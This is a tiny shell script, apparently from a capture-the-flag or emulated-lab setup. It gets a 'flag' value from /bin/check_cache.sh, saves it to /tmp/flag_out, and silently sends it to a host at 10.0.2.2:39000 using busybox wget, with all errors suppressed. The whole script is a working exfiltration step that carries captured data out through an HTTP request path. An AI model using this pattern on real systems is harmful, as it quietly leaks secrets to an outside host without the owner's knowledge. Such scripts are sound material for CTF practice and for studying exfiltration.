#!/bin/sh

FLAG="$("/bin/check_cache.sh")"

printf '%s\n' "$FLAG" > /tmp/flag_out
sync
/bin/busybox wget -qO- "http://10.0.2.2:39000/${FLAG}" >/dev/null 2>&1 || true
